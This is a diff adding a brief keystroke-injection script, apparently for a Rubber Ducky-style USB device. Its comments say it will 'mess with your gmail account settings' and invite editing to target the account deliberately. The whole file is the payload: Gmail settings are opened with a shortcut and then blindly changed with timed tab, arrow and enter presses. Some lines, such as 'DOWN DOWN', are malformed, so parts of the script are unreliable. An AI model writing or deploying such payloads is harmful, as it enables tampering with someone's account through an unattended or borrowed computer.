@@ -1,0 +1,26 @@
+REM will do something random and mess with your gmail account settings (you can edit if you actually want it to do something to your account)
+CTRL ,
+DELAY 200
+TAB
+DELAY 199
+ENTER
+DELAY 200
+TAB
+TAB
+TAB
+ENTER
+UP ARROW
+UP ARROW 
+UP ARROW 
+TAB
+ENTER
+TAB
+UP ARROW 
+UP ARROW 
+TAB
+DOWN DOWN
+TAB
+ENTER
+TAB
+DOWN ARROW
+REM will do something random and mess with your gmail account settings (you can edit if you actually want it to do something to your account)
